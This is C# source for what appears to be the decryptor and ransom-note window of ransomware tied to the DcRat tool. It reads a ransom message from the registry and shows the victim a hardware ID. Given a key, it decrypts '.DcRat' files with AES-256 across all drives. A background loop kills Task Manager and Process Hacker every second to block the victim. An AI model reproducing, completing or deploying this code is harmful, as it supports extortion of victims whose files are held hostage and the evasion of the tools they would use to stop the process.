using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using WMPLib;

namespace DECF
{
    public partial class Form1
    {
        public Form1()
        {
            Player = new WindowsMediaPlayer();
            InitializeComponent();
        }

        public string Pass;
        private int Finished = 0;
        private int FileCount = 0;
        private string userName = Environment.UserName;
        private bool OK = false;
        private object C_DIR = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 3);

        private void btnDecrypt_Click(object sender, EventArgs e)
        {
            try
            {
                if (string.IsNullOrEmpty(txtKey.Text) || (txtKey.Text ?? "") == "KEY")
                {
                    Interaction.MsgBox("You Need a KEY", MsgBoxStyle.Critical);
                }
                else
                {
                    txtFiles.Text = string.Empty;
                    Pass = txtKey.Text;
                    btnDecrypt.Text = "Please Wait...";
                    btnDecrypt.Enabled = false;
                    txtKey.ReadOnly = true;
                    var D1 = new System.Threading.Thread(Dec);
                    D1.Start();
                }
            }
            catch (Exception ex)
            {
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            try
            {
                txtFiles.Text = HWID();
                txtMSG.Text = Conversions.ToString(Registry.GetValue(@"HKEY_CURRENT_USER\Software\" + HWID(), "Rans-MSG", null));
                BackgroundWorker4.RunWorkerAsync();
            }
            catch (Exception ex)
            {
            }
        }

        
        public static string HWID()
        {
            try
            {
                return GetHash(string.Concat(Environment.ProcessorCount, Environment.UserName,
                    Environment.MachineName, Environment.OSVersion
                    , new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize));
            }
            catch
            {
                return "Err HWID";
            }
        }

        public static string GetHash(string strToHash)
        {
            MD5CryptoServiceProvider md5Obj = new MD5CryptoServiceProvider();
            byte[] bytesToHash = Encoding.ASCII.GetBytes(strToHash);
            bytesToHash = md5Obj.ComputeHash(bytesToHash);
            StringBuilder strResult = new StringBuilder();
            foreach (byte b in bytesToHash)
                strResult.Append(b.ToString("x2"));
            return strResult.ToString().Substring(0, 20).ToUpper();
        }

        

        public void Dec()
        {
            try
            {
                BackgroundWorker1.WorkerSupportsCancellation = true;
                BackgroundWorker1.RunWorkerAsync();
                BackgroundWorker2.WorkerSupportsCancellation = true;
                BackgroundWorker2.RunWorkerAsync();
                BackgroundWorker3.WorkerSupportsCancellation = true;
                BackgroundWorker3.RunWorkerAsync();
                while (Finished != 3)
                    System.Threading.Thread.Sleep(50);
                if (OK)
                {
                    Registry.SetValue(@"HKEY_CURRENT_USER\Software\" + HWID(), "Rans-Status", "Decrypted");
                    Interaction.MsgBox("Done!", MsgBoxStyle.SystemModal);
                }

                Finished = 0;
                Pass = string.Empty;
                btnDecrypt.Enabled = true;
                btnDecrypt.Text = "Decrypt";
                txtKey.ReadOnly = false;
            }
            catch (Exception ex)
            {
            }
        }

        public byte[] AES_Dec(byte[] B2Dec, byte[] KeyBytes)
        {
            byte[] DecBytes = null;
            var saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            using (var ms = new MemoryStream())
            {
                using (var AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;
                    var key = new Rfc2898DeriveBytes(KeyBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes((int)(AES.KeySize / (double)8));
                    AES.IV = key.GetBytes((int)(AES.BlockSize / (double)8));
                    AES.Mode = CipherMode.CBC;
                    using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(B2Dec, 0, B2Dec.Length);
                        cs.Close();
                    }

                    DecBytes = ms.ToArray();
                }
            }

            return DecBytes;
        }

        public void File_Dec(string file, string key)
        {
            try
            {
                if (file.EndsWith(".DcRat"))
                {
                    var B2Dec = File.ReadAllBytes(file);
                    var KeyBytes = System.Text.Encoding.UTF8.GetBytes(key);
                    KeyBytes = SHA256.Create().ComputeHash(KeyBytes);
                    var BytesDec = AES_Dec(B2Dec, KeyBytes);
                    File.WriteAllBytes(file, BytesDec);
                    string exten = Path.GetExtension(file);
                    string result = file.Substring(0, file.Length - exten.Length);
                    File.Move(file, result);
                    FileCount += 1;
                    OK = true;
                    txtFiles.AppendText("[" + FileCount.ToString() + "] " + Path.GetFileName(file));
                    txtFiles.AppendText(Environment.NewLine);
                }
            }
            catch (Exception ex)
            {
                txtFiles.AppendText("[Wrong Key]");
                txtFiles.AppendText(Environment.NewLine);
                return;
            }
        }

        public void Dir_Dec(string ThePath, string key)
        {
            try
            {
                var files = Directory.GetFiles(ThePath);
                var SubDirectories = Directory.GetDirectories(ThePath);
                for (int i = 0, loopTo = files.Length - 1; i <= loopTo; i++)
                    File_Dec(files[i], key);
                for (int i = 0, loopTo1 = SubDirectories.Length - 1; i <= loopTo1; i++)
                    Dir_Dec(SubDirectories[i], key);
            }
            catch (Exception ex)
            {
            }
        }

        private void txtFiles_TextChanged(object sender, EventArgs e)
        {
            txtFiles.Text.Trim();
            txtFiles.Focus();
            txtFiles.ScrollToCaret();
        }

        private void Form1_Closing(object sender, CancelEventArgs e)
        {
            Environment.Exit(0);
        }

        private void BackgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
        {
            Dir_Dec(Conversions.ToString(C_DIR), Pass);
            Finished += 1;
        }

        private void BackgroundWorker2_DoWork(object sender, DoWorkEventArgs e)
        {
            foreach (var drive in Environment.GetLogicalDrives())
            {
                var Driver = new DriveInfo(drive);
                if (Driver.DriveType == DriveType.Fixed && !Driver.ToString().Contains(Conversions.ToString(C_DIR)))
                {
                    string DriverPath = drive;
                    Dir_Dec(DriverPath, Pass);
                }
            }

            Finished += 1;
        }

        private void BackgroundWorker3_DoWork(object sender, DoWorkEventArgs e)
        {
            foreach (var drive in Environment.GetLogicalDrives())
            {
                var Driver = new DriveInfo(drive);
                if (!(Driver.DriveType == DriveType.Fixed) && !Driver.ToString().Contains(Conversions.ToString(C_DIR)))
                {
                    string DriverPath = drive;
                    Dir_Dec(DriverPath, Pass);
                }
            }

            Finished += 1;
        }

        private WindowsMediaPlayer _Player;

        private WindowsMediaPlayer Player
        {
            [MethodImpl(MethodImplOptions.Synchronized)]
            get
            {
                return _Player;
            }

            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                if (_Player != null)
                {
                }

                _Player = value;
                if (_Player != null)
                {
                }
            }
        }
                
        private void BackgroundWorker4_DoWork(object sender, DoWorkEventArgs e)
        {
            try
            {
                while (true)
                {
                    foreach (Process x in Process.GetProcesses())
                    {
                        if ((x.ProcessName ?? "") == "ProcessHacker" || (x.ProcessName ?? "") == "Taskmgr")
                        {
                            x.Kill();
                        }
                    }

                    System.Threading.Thread.Sleep(1000);
                }
            }
            catch (Exception ex)
            {
            }
        }
    }
}